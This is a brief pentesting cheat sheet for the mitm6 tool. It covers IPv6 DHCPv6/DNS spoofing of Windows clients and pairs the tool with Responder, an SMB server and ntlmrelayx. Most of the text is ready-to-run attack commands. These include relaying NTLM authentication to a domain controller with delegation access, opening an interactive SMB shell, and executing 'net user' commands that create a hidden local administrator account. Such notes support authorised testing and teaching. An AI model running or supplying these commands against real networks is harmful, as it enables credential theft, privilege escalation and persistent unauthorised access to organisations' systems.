# Mitm6 
## Resources
1. https://cheatsheet.haax.fr/windows-systems/exploitation/ipv6/
2. https://github.com/fox-it/mitm6
3. https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
4. https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
5. https://systemadminspro.com/domain-attacks-getting-an-account/
6. https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
7. https://blog.vonahi.io/taking-over-ipv6-networks/
8. https://intrinium.com/mitm6-pen-testing/

mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server

When using mitm6, it issues a DHCPv6 lease to clients that last for a period of 300 seconds (or 5 minutes) Due to this, it's possible that several DNS queries will actually fail, resulting in clients not being able to access services that rely on DNS names. You can, however, change this in the source code.

## Gonna create a fake DNS server for targets
```
sudo mitm6 -d lab.local
```

# Using with SMB server 
## First shell
```
sudo mitm6 -i eth0
```
## Second shell
```
smbserver.py SHARE_NAME path/to/share
```
# Using with Responder 
## First shell
```
sudo mitm6 -i eth0
```
## Second shell
```
responder -I eth0 -wFv
```
# Using with ntlmrelayx 
## First attacking shell
```
sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
```
## Second attacking shell
```
ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
```
  - wh == server hosting WPAD (attacking IP)
  - t == target for relay
  - i == open interactive shell

```
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
```
## Or
```
ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user xuser xpass /add && net localgroup Administrators xuser /add"
```
